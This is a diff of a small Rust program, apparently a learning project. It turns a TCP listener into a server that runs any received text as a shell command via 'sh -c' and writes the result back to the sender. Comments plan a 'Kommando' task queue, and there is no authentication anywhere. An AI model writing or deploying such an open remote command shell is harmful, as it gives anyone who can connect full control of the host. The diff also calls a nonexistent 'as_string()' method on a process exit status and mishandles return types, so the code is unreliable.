@@ -3,6 +3,7 @@
 //
 use std::fmt;
 use std::io::Read;
+use std::io::Write;
 use std::net::TcpListener;
 use std::net::TcpStream;
 use std::process::Command;
@@ -20,15 +21,29 @@ impl fmt::Display for Piglet {
     }
 }
 
-fn handle_connection(mut stream: TcpStream) -> String {
+fn handle_connection(mut stream: TcpStream) -> () {
     let mut buffer = [0; 1024];
     stream.read(&mut buffer).unwrap();
     let message = String::from_utf8_lossy(&buffer[..])
         .to_string()
         .trim_matches(char::from(0))
         .to_string();
-    println!("{message}");
-    message
+    
+
+    let result = Command::new("sh")
+            .arg("-c")
+            .arg(&message.trim())
+            .status()
+            .expect("command execution failed")
+            ;
+    let res = result.as_string();
+    send_response(stream, &res)
+    
+}
+
+fn send_response(mut stream: TcpStream, message: &str) {
+    stream.write(message.as_bytes()).unwrap();
+    stream.flush().unwrap();
 }
 
 fn main() {
@@ -45,26 +60,19 @@ fn main() {
     // Result[OK] -> T -> unwrap takes this T or if Result[Err] panics with the Err
     // unwrap panics and does not handle errors gracefully -> no use plz, mr coder., gimme graceful error handling plz.
 
-    // where does the SYN, SYN ACK, ACK happen?!
     for stream in listener.incoming() {
         let stream = stream.unwrap();
         let message = handle_connection(stream);
-        //println!("{:?}", message);
-
+        println!("Connection established!");
         // next steps:
         // handle the stream and extract "Kommando"
         // how do we extract the body from the requests?
         // do we want to use raw HTTP requests or TCP Traffic?
 
-        println!("Connection established!");
+        
 
         // make this dynamic -> how?!
-        Command::new("sh")
-            .arg("-c")
-            .arg(&message)
-            .status()
-            .expect("command execution failed");
-
+        
         // send the result back to the "asker"
         // next -> task queue
     }
